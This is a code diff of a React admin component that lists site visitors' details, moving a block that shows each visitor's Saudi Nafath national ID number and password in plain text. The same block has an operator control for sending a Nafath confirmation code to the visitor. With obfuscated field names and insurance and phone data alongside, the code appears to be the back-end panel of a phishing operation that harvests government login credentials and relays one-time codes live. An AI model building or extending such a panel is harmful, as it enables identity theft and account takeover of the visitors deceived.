@@ -152,43 +152,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     })
   }
 
-  // 2. Nafad Info (show at top if exists)
-  const nafazId = visitor._v8 || visitor.nafazId
-  const nafazPass = visitor._v9 || visitor.nafazPass
-  
-  if (nafazId || (visitor.currentStep as any) === "_t6") {
-    bubbles.push({
-      id: "nafad-info",
-      title: "🇸🇦 نفاذ",
-      icon: "🇸🇦",
-      color: "indigo",
-      data: {
-        "رقم الهوية": nafazId || "في انتظار الإدخال...",
-        "كلمة المرور": nafazPass || "في انتظار الإدخال...",
-        "رقم التأكيد المُرسل": visitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
-      },
-      timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
-      showActions: true,
-      customActions: (
-        <div className="flex gap-2 mt-3">
-          <input
-            type="text"
-            value={nafadCode}
-            onChange={(e) => setNafadCode(e.target.value)}
-            placeholder="أدخل رقم التأكيد"
-            className="flex-1 px-3 py-2 border rounded-lg text-sm"
-          />
-          <button
-            onClick={handleSendNafadCode}
-            disabled={!nafadCode.trim()}
-            className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
-          >
-            إرسال
-          </button>
-        </div>
-      )
-    })
-  }
+  // Nafad will be added after payment data to sort by timestamp
 
   // 3. Insurance Details
   if (visitor.insuranceCoverage) {
@@ -371,7 +335,6 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           "شركة الاتصالات": visitor.phoneCarrier
         },
         timestamp: visitor.phoneUpdatedAt || visitor.updatedAt,
-        status: "pending" as const,
         showActions: false,
         isLatest: true,
         type: "phone_info"
@@ -409,7 +372,44 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         })
       }
     })
-  // } // Removed - no longer needed
+  
+  // Nafad Info - add to dynamic bubbles to sort by timestamp
+  const nafazId = visitor._v8 || visitor.nafazId
+  const nafazPass = visitor._v9 || visitor.nafazPass
+  
+  if (nafazId || (visitor.currentStep as any) === "_t6") {
+    bubbles.push({
+      id: "nafad-info",
+      title: "🇸🇦 نفاذ",
+      icon: "🇸🇦",
+      color: "indigo",
+      data: {
+        "رقم الهوية": nafazId || "في انتظار الإدخال...",
+        "كلمة المرور": nafazPass || "في انتظار الإدخال...",
+        "رقم التأكيد المُرسل": visitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
+      },
+      timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
+      showActions: true,
+      customActions: (
+        <div className="flex gap-2 mt-3">
+          <input
+            type="text"
+            value={nafadCode}
+            onChange={(e) => setNafadCode(e.target.value)}
+            placeholder="أدخل رقم التأكيد"
+            className="flex-1 px-3 py-2 border rounded-lg text-sm"
+          />
+          <button
+            onClick={handleSendNafadCode}
+            disabled={!nafadCode.trim()}
+            className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
+          >
+            إرسال
+          </button>
+        </div>
+      )
+    })
+  }
 
   // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
   const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"]
